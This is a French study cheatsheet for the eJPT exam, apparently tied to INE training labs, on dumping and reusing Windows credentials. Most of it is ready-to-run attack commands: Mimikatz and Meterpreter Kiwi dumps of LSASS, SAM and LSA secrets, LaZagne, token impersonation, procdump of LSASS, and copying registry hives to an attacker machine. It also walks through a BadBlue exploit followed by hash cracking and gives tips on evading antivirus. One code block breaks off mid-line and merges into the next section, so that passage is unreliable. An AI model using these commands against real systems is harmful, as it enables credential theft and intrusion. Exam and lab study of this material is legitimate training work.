# üîê Windows Credentials Dumping - Cheatsheet eJPT

## üìã 1. Vue d'ensemble des sources de credentials

### Emplacements courants de credentials
| Source | Emplacement | Type de donn√©es |
|--------|-------------|-----------------|
| **Unattend.xml** | `C:\Windows\Panther\Unattend.xml` | Passwords en base64 |
| **Registry AutoLogon** | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` | Plaintext passwords |
| **LSASS Memory** | Processus lsass.exe | Hashes NTLM, Kerberos tickets |
| **SAM Database** | `C:\Windows\System32\config\SAM` | Hashes NTLM locaux |
| **LSA Secrets** | Registry + LSASS | Service passwords, machine account |
| **Credential Manager** | `%LOCALAPPDATA%\Microsoft\Credentials\` | Stored credentials |

---

## üîç 2. Recherche automatis√©e de credentials

### PowerUp.ps1 - √ânum√©ration compl√®te
| Commande | Description |
|----------|-------------|
| `powershell -ep bypass` | Bypass execution policy |
| `. .\PowerUp.ps1` | Charger le script |
| `Invoke-PrivescAudit` | Audit complet incluant credentials |
| `Get-UnattendedInstallFile` | Chercher sp√©cifiquement Unattend.xml |
| `Get-Webconfig` | Chercher credentials dans web.config |
| `Get-ApplicationHost` | Chercher dans ApplicationHost.config |

### PrivescCheck.ps1 - Recherche de credentials
| Commande | Description |
|----------|-------------|
| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"` | Scan complet |
| `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"` | Recherche √©tendue |

### WinPEAS - √ânum√©ration credentials
| Commande | Description |
|----------|-------------|
| `winPEASany.exe` | √ânum√©ration compl√®te |
| `winPEASany.exe quiet` | Mode silencieux |
| `winPEASany.exe cmd` | Version command line |

---

## üìÅ 3. Fichiers Unattend.xml

### Emplacements possibles d'Unattend.xml
| Chemin | Description |
|--------|-------------|
| `C:\Windows\Panther\Unattend.xml` | Emplacement principal |
| `C:\Windows\Panther\Unattended.xml` | Variante du nom |
| `C:\Windows\System32\sysprep\unattend.xml` | Dossier sysprep |
| `C:\Windows\System32\sysprep\Panther\unattend.xml` | Panther dans sysprep |

### Lecture et d√©codage d'Unattend.xml
| √âtape | Commande |
|-------|----------|
| **Localiser le fichier** | `dir C:\Windows\Panther\*.xml` |
| **Lire le contenu** | `cat C:\Windows\Panther\Unattend.xml` |
| **D√©coder base64** | `$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5AMTIz"))` |
| **Afficher r√©sultat** | `echo $password` |

### Exemple de d√©codage PowerShell
```powershell
# D√©coder un password base64 trouv√© dans Unattend.xml
$password='QWRtaW5AMTIz'
$decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $decoded
# R√©sultat: Admin@123
```

---

## üóùÔ∏è 4. Registry - AutoLogon Credentials

### Recherche d'AutoLogon credentials
| Registre | Commande |
|----------|----------|
| **AutoLogon principal** | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` |
| **Utilisateur par d√©faut** | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName` |
| **Mot de passe** | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword` |
| **Domaine** | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName` |

### PowerShell pour AutoLogon
```powershell
# Recherche compl√®te AutoLogon
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object DefaultUserName,DefaultPassword,DefaultDomainName
```

---

## üíæ 5. Dumping avec Meterpreter - Extension Kiwi

### Workflow avec Kiwi (ex-Mimikatz)
| √âtape | Commande | Description |
|-------|----------|-------------|
| **1. Obtenir Meterpreter** | Exploitation initiale | Via BadBlue, HFS, etc. |
| **2. Migrer vers lsass** | `migrate -N lsass.exe` | Acc√®s aux credentials en m√©moire |
| **3. Charger Kiwi** | `load kiwi` | Charger l'extension |
| **4. Dump complet** | `creds_all` | Tous les credentials disponibles |
| **5. Dump SAM** | `lsa_dump_sam` | Hashes NTLM locaux |
| **6. Dump LSA Secrets** | `lsa_dump_secrets` | Secrets LSA et syskey |

### Commandes Kiwi d√©taill√©es
| Commande | Description | Sortie |
|----------|-------------|--------|
| `creds_all` | Dump complet credentials | Passwords, hashes NTLM |
| `creds_kerberos` | Tickets Kerberos | Tickets TGT/TGS |
| `creds_msv` | Credentials MSV | Hashes NTLM/LM |
| `creds_ssp` | SSP credentials | Passwords en clair |
| `creds_tspkg` | TSPKG credentials | Terminal Services |
| `creds_wdigest` | WDigest credentials | Passwords en clair |
| `lsa_dump_sam` | Dump SAM database | Hashes utilisateurs locaux |
| `lsa_dump_secrets` | Dump LSA secrets | Machine account, services |
| `wifi_list` | Profils WiFi | Passwords WiFi stock√©s |

---

## üîì 6. Mimikatz Standalone

### Commandes Mimikatz essentielles
| Commande | Description |
|----------|-------------|
| `privilege::debug` | Activer privil√®ges debug |
| `sekurlsa::logonpasswords` | Dump passwords en m√©moire |
| `sekurlsa::wdigest` | Credentials WDigest |
| `sekurlsa::msv` | Hashes NTLM/LM |
| `sekurlsa::kerberos` | Tickets Kerberos |
| `sekurlsa::tspkg` | Terminal Services |
| `lsadump::sam` | Dump SAM (n√©cessite SYSTEM) |
| `lsadump::secrets` | Dump LSA secrets |
| `lsadump::cache` | Domain cached credentials |

### Workflow Mimikatz
```cmd
# Lancement et configuration
mimikatz.exe
privilege::debug

# Dump m√©moire LSASS
sekurlsa::logonpasswords

# Dump SAM local
lsadump::sam

# Dump LSA secrets
lsadump::secrets
```

---

## üõ†Ô∏è 7. Autres outils de dumping

### LaZagne - Multi-software password recovery

#### üéØ Via Meterpreter (M√©thode recommand√©e eJPT)
| √âtape | Commande | Description |
|-------|----------|-------------|
| **1. Upload LaZagne** | `upload /path/to/laZagne.exe C:\\temp\\laZagne.exe` | Upload sur la cible |
| **2. Ex√©cuter via Meterpreter** | `execute -f "C:\\temp\\laZagne.exe" -a "all"` | Ex√©cution avec arguments |
| **3. Ex√©cution interactive** | `shell` puis `C:\\temp\\laZagne.exe all` | Via shell Meterpreter |
| **4. Sauvegarde r√©sultats** | `execute -f "C:\\temp\\laZagne.exe" -a "all -oN"` | Sauvegarde dans fichier |

#### üíª Utilisation Standalone (Acc√®s direct)
| Commande | Description |
|----------|-------------|
| `laZagne.exe all` | Dump tous les passwords |
| `laZagne.exe all -v` | Mode verbose |
| `laZagne.exe browsers` | Passwords navigateurs |
| `laZagne.exe chats` | Applications de chat |
| `laZagne.exe databases` | Base de donn√©es |
| `laZagne.exe games` | Jeux |
| `laZagne.exe git` | Credentials Git |
| `laZagne.exe mails` | Clients email |
| `laZagne.exe memory` | Passwords en m√©moire |
| `laZagne.exe wifi` | Passwords WiFi |
| `laZagne.exe all -oN` | Sauvegarde dans fichier |
| `laZagne.exe all -oJ` | Sortie format JSON |

### Mimikatz 

#### üéØ Via Meterpreter (avec Kiwi - Int√©gr√©)
| Commande Kiwi | √âquivalent Mimikatz | Description |
|---------------|---------------------|-------------|
| `load kiwi` | - | Charger extension (int√©gr√©) |
| `creds_all` | `sekurlsa::logonpasswords` | Dump complet |
| `creds_msv` | `sekurlsa::msv` | Hashes NTLM/LM |
| `creds_wdigest` | `sekurlsa::wdigest` | Passwords WDigest |
| `creds_kerberos` | `sekurlsa::kerberos` | Tickets Kerberos |
| `lsa_dump_sam` | `lsadump::sam` | Dump SAM |
| `lsa_dump_secrets` | `lsadump::secrets` | Dump LSA secrets |

#### üíª Mimikatz Standalone
```cmd
# M√©thode 1: Upload et ex√©cution via Meterpreter
upload /path/to/mimikatz.exe C:\\temp\\mimikatz.exe
shell
cd C:\\temp
mimikatz.exe

# Dans Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
exit
```

#### üîÑ Mimikatz Standalone (Acc√®s direct)
| Commande | Description |
|----------|-------------|
| `mimikatz.exe` | Lancement interactif |
| `privilege::debug` | Activer privil√®ges debug |
| `sekurlsa::logonpasswords` | Dump passwords en m√©moire |
| `sekurlsa::wdigest` | Credentials WDigest |
| `sekurlsa::msv` | Hashes NTLM/LM |
| `sekurlsa::kerberos` | Tickets Kerberos |
| `sekurlsa::tspkg` | Terminal Services |
| `lsadump::sam` | Dump SAM (n√©cessite SYSTEM) |
| `lsadump::secrets` | Dump LSA secrets |
| `lsadump::cache` | Domain cached credentials |

#### üöÄ Mimikatz One-liner (Non-interactif)
```cmd
# Dump passwords en une commande
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > passwords.txt

# Dump SAM en une commande  
mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam_dump.txt

# Dump complet
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "exit" > full_dump.txt
```

### Incognito

#### üéØ Via Meterpreter (Int√©gr√© - M√©thode principale)
| √âtape | Commande | Description |
|-------|----------|-------------|
| **1. Charger Incognito** | `load incognito` | Extension int√©gr√©e √† Meterpreter |
| **2. Lister tokens utilisateurs** | `list_tokens -u` | Tokens utilisateurs disponibles |
| **3. Lister tokens groupes** | `list_tokens -g` | Tokens de groupes disponibles |
| **4. Impersonner token** | `impersonate_token DOMAIN\\Administrator` | Impersonation |
| **5. V√©rifier identit√©** | `getuid` | Confirmer impersonation |
| **6. Voler token processus** | `steal_token [PID]` | Voler token d'un processus |
| **7. Retour token original** | `rev2self` | Retourner au token original |

#### üíª Incognito Standalone (Rare, principalement int√©gr√©)
```cmd
# Upload de l'outil standalone (si disponible)
upload /path/to/incognito.exe C:\\temp\\incognito.exe

# Ex√©cution via shell Meterpreter
shell
cd C:\\temp

# Utilisation standalone (syntaxe similaire)
incognito.exe list_tokens -u
incognito.exe execute -c "DOMAIN\\Administrator" cmd.exe
```

### Secretsdump.py (Impacket) - Externe uniquement

#### üåê Utilisation distante (depuis Kali)
| Commande | Description |
|----------|-------------|
| `secretsdump.py domain/user:pass@target` | Dump distant avec credentials |
| `secretsdump.py -hashes :ntlmhash domain/user@target` | Avec hash NTLM |
| `secretsdump.py -sam sam.hive -system system.hive LOCAL` | Dump hors ligne |
| `secretsdump.py -ntds ntds.dit -system system.hive LOCAL` | Dump Active Directory |
| `secretsdump.py -just-dc domain/user:pass@target` | Domain Controller seulement |
| `secretsdump.py -history domain/user:pass@target` | Inclure historique passwords |

#### üìÅ R√©cup√©ration de fichiers via Meterpreter pour Secretsdump
```bash
# Dans Meterpreter - R√©cup√©rer fichiers syst√®me
download C:\\Windows\\System32\\config\\SAM /tmp/SAM
download C:\\Windows\\System32\\config\\SYSTEM /tmp/SYSTEM
download C:\\Windows\\System32\\config\\SECURITY /tmp/SECURITY

# Sur Kali - Analyse offline
secretsdump.py -sam /tmp/SAM -system /tmp/SYSTEM LOCAL
```

### Procdump + Mimikatz (M√©thode OPSEC)

#### üéØ Via Meterpreter
```bash
# 1. Upload procdump
upload /path/to/procdump.exe C:\\temp\\procdump.exe

# 2. Dump LSASS via Meterpreter
shell
cd C:\\temp
procdump.exe -ma lsass.exe lsass.dmp

# 3. Download du dump
exit  # Sortir du shell
download C:\\temp\\lsass.dmp /tmp/lsass.dmp

# 4. Analyse sur Kali
mimikatz "sekurlsa::minidump /tmp/lsass.dmp" "sekurlsa::logonPasswords" exit
```

#### üíª M√©thode Standalone
| √âtape | Commande |
|-------|----------|
| **1. Dump LSASS** | `procdump.exe -ma lsass.exe lsass.dmp` |
| **2. Analyse offline** | `mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit` |

---

## üéØ 8. Utilisation des credentials trouv√©s

### Avec runas
| Commande | Description |
|----------|-------------|
| `runas /user:administrator cmd` | Lancer cmd en tant qu'admin |
| `runas /user:domain\administrator cmd` | Avec domaine |
| `runas /savecred /user:administrator cmd` | Utiliser credentials sauvegard√©s |
| `runas /netonly /user:domain\user cmd` | Pour acc√®s r√©seau |

### Avec PsExec
| Commande | Description |
|----------|-------------|
| `psexec.exe -u administrator -p password cmd` | Ex√©cution locale |
| `psexec.exe \\target -u administrator -p password cmd` | Ex√©cution distante |

### Avec net use (partages)
| Commande | Description |
|----------|-------------|
| `net use \\target\admin$ /user:administrator password` | Montage partage admin |
| `net use \\target\c$ /user:domain\administrator password` | Partage C: |

---

## üìä 9. Formats des credentials

### Types de hashes
| Type | Format | Exemple |
|------|--------|---------|
| **NTLM Hash** | 32 caract√®res hex | `e3c61a68f1b89ee6c8ba9507378dc88d` |
| **LM Hash** | 32 caract√®res hex | `aad3b435b51404eeaad3b435b51404ee` |
| **Syskey** | 32 caract√®res hex | `377af0de68bdc918d22c57a263d38326` |

### D√©codage Base64
```powershell
# M√©thode PowerShell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_STRING"))

# M√©thode Linux (si disponible)
echo "BASE64_STRING" | base64 -d
```

---

## üîÑ 10. Workflows comparatifs - Meterpreter vs Standalone

### LaZagne - Comparaison des m√©thodes
| Crit√®re | Via Meterpreter | Standalone |
|---------|----------------|------------|
| **OPSEC** | ‚úÖ Moins d√©tectable | ‚ö†Ô∏è Plus visible |
| **Simplicit√©** | ‚úÖ Upload automatique | ‚ùå Transfer manuel |
| **R√©sultats** | ‚úÖ R√©cup√©ration easy | ‚ùå Fichiers sur disque |
| **D√©tection AV** | ‚úÖ Ex√©cution en m√©moire | ‚ùå Fichier sur disque |

### Mimikatz - Comparaison des m√©thodes  
| Crit√®re | Kiwi (Meterpreter) | Mimikatz Standalone |
|---------|-------------------|-------------------|
| **Installation** | ‚úÖ Int√©gr√© | ‚ùå Upload requis |
| **D√©tection** | ‚úÖ Signatures diff√©rentes | ‚ùå Fortement signatur√© |
| **Fonctionnalit√©s** | ‚ö†Ô∏è Limit√©es | ‚úÖ Compl√®tes |
| **Facilit√©** | ‚úÖ Commandes simples | ‚ùå Syntaxe complexe |

### Incognito - Comparaison
| Crit√®re | Meterpreter | Standalone |
|---------|-------------|------------|
| **Disponibilit√©** | ‚úÖ Toujours pr√©sent | ‚ùå Rare/obsol√®te |
| **Int√©gration** | ‚úÖ Seamless | ‚ùå Complexe |
| **Recommandation** | ‚úÖ **Utilisez uniquement cette m√©thode** | ‚ùå Non recommand√© |

---

## üéØ 11. Workflow complet eJPT avec choix des outils

### 1. √ânum√©ration initiale
```powershell
# PowerUp pour recherche g√©n√©rale
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit

# Recherche sp√©cifique Unattend.xml
dir C:\Windows\Panther\*.xml
cat C:\Windows\Panther\Unattend.xml

# Registry AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### 2. Si credentials trouv√©s
```cmd
# Test avec runas
runas /user:administrator cmd
# Entrer le password trouv√©

# V√©rification
whoami
```

### 3. Obtention Meterpreter via HTA (Workflow complet)

#### üéØ C√¥t√© Windows (Machine cible)
```powershell
# 1. √ânum√©ration initiale avec PowerUp
cd .\Desktop\PowerSploit\Privesc\
ls
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit

# 2. Lecture du fichier Unattend.xml trouv√©
cat C:\Windows\Panther\Unattend.xml

# 3. D√©codage du password base64 (ex: "QWRtaW5AMTIz")
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password
# R√©sultat: Admin@123

# 4. Test credentials avec runas
runas.exe /user:administrator cmd
Admin@123
whoami  # V√©rification: Administrator
```

#### üñ•Ô∏è C√¥t√© Kali (Machine attaquante)
```bash
# 5. Configuration du serveur HTA
msfconsole -q
use exploit/windows/misc/hta_server
set LHOST [IP_KALI]        # Ex: 10.10.31.2
set LPORT 4444             # Port d'√©coute
exploit                    # D√©marre le serveur HTA
# URL g√©n√©r√©e: http

### 4. Dumping avanc√© - Choix de la m√©thode
```bash
# Option A: Kiwi (recommand√© pour eJPT)
migrate -N lsass.exe
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

# Option B: LaZagne via Meterpreter
upload /path/to/laZagne.exe C:\\temp\\laZagne.exe
execute -f "C:\\temp\\laZagne.exe" -a "all"

# Option C: Incognito pour impersonation
load incognito
list_tokens -u
impersonate_token DOMAIN\\Administrator
```

### 5. Choix d'outil selon le contexte
| Contexte | Outil recommand√© | M√©thode |
|----------|------------------|---------|
| **Lab eJPT standard** | Kiwi | Via Meterpreter |
| **Anti-virus pr√©sent** | Kiwi + Procdump | Dump offline |
| **Credentials applications** | LaZagne | Via Meterpreter |
| **Token impersonation** | Incognito | Via Meterpreter |
| **Analyse forensique** | Secretsdump | Externe |

---

## ‚ö†Ô∏è 12. Points d'attention pour l'eJPT

### Outils prioritaires eJPT
1. **Kiwi (Meterpreter)** - Int√©gr√©, efficace, moins d√©tectable
2. **LaZagne via Meterpreter** - Pour applications tierces  
3. **Incognito (Meterpreter)** - Pour impersonation uniquement
4. **Mimikatz standalone** - Si Kiwi insuffisant

### M√©thodes recommand√©es par contexte
| Situation | Outil | M√©thode |
|-----------|-------|---------|
| **Premier dump** | Kiwi | `load kiwi` ‚Üí `creds_all` |
| **Applications tierces** | LaZagne | Upload ‚Üí Execute via Meterpreter |
| **Token disponible** | Incognito | `load incognito` ‚Üí `impersonate_token` |
| **AV d√©tection** | Procdump | Dump ‚Üí Analyse offline |
| **Acc√®s direct** | Standalone | Selon disponibilit√© |

### Erreurs √† √©viter
- Ne pas oublier de d√©coder les passwords base64
- V√©rifier tous les emplacements d'Unattend.xml
- Migrer vers lsass.exe avant d'utiliser Kiwi
- Tester les credentials trouv√©s imm√©diatement

### Workflow recommand√©
1. **√ânum√©ration manuelle** (Unattend.xml, Registry)
2. **Scripts automatis√©s** (PowerUp, PrivescCheck)
3. **Test credentials** (runas, PsExec)
4. **Escalade** vers SYSTEM si n√©cessaire
5. **Dumping avanc√©** (Kiwi, Mimikatz)

### Commandes essentielles √† retenir
```powershell
# Recherche Unattend.xml
cat C:\Windows\Panther\Unattend.xml

# D√©codage base64
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PASSWORD_BASE64"))

# Registry AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

```bash
# Kiwi dans Meterpreter (priorit√© 1)
load kiwi
creds_all
lsa_dump_sam

# LaZagne via Meterpreter
upload laZagne.exe C:\\temp\\laZagne.exe  
execute -f "C:\\temp\\laZagne.exe" -a "all"

# Incognito dans Meterpreter
load incognito
list_tokens -u
impersonate_token DOMAIN\\Administrator
```

**üéØ Astuce eJPT** : 
- **Priorit√© 1** : Unattend.xml et AutoLogon Registry
- **Priorit√© 2** : Kiwi via Meterpreter (`creds_all`)  
- **Priorit√© 3** : LaZagne via Meterpreter pour apps tierces
- **Incognito** : Uniquement via Meterpreter pour impersonation !



# Windows NTLM Hash Cracking - Cheatsheet

## Vue d'ensemble
Cette cheatsheet couvre le processus complet de cracking de hashes NTLM sur Windows via l'exploitation d'un serveur BadBlue vuln√©rable.

## Pr√©requis
- Machine Kali Linux
- Metasploit Framework
- Base de donn√©es PostgreSQL

---

## 1. Reconnaissance initiale

### Test de connectivit√©
```bash
ping -c 4 demo.ine.local
```

### Scan Nmap basique
```bash
nmap demo.ine.local
```

### Scan de version sur port sp√©cifique
```bash
nmap -sV -p 80 demo.ine.local
```

---

## 2. Recherche d'exploits

### Recherche avec Searchsploit
```bash
searchsploit badblue 2.7
```

---

## 3. Exploitation avec Metasploit

### D√©marrage des services
```bash
# D√©marrer PostgreSQL
/etc/init.d/postgresql start

# Lancer Metasploit
msfconsole -q
```

### Configuration de l'exploit
```bash
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit
```

---

## 4. Post-exploitation

### Migration de processus
```bash
# Migrer vers lsass.exe pour acc√®s aux hashes
migrate -N lsass.exe
```

### Extraction des hashes NTLM
```bash
# Dump des hashes
hashdump
```

---

## 5. Gestion des credentials

### V√©rification du stockage en base
```bash
# Retour au framework MSF
background

# Affichage des credentials stock√©s
creds
```

---

## 6. Cracking des hashes

### Module de cracking auxiliaire
```bash
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
```

---

## R√©sultats attendus

### Credentials crack√©s
- **Administrator**: password
- **bob**: password1

---

## Commandes rapides - R√©sum√©

```bash
# Reconnaissance
ping -c 4 demo.ine.local
nmap -sV -p 80 demo.ine.local

# Exploitation
/etc/init.d/postgresql start
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit

# Post-exploitation
migrate -N lsass.exe
hashdump
background
creds

# Cracking
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
```

---

## Points cl√©s √† retenir

1. **Migration critique**: Toujours migrer vers `lsass.exe` pour acc√©der aux hashes
2. **Base de donn√©es**: Les credentials sont automatiquement stock√©s dans la DB MSF
3. **Wordlists**: Utiliser des wordlists appropri√©es selon le contexte
4. **Persistance**: Les hashes restent disponibles m√™me apr√®s fermeture de session

---

## R√©f√©rences
- [BadBlue 2.72b - Multiple Vulnerabilities](https://www.exploit-db.com/exploits/4715)
- [Metasploit BadBlue Module](https://www.rapid7.com/db/modules/exploit/windows/http/badblue_passthru/)
- [Password Cracker: Windows](https://www.rapid7.com/db/modules/auxiliary/analyze/crack_windows/)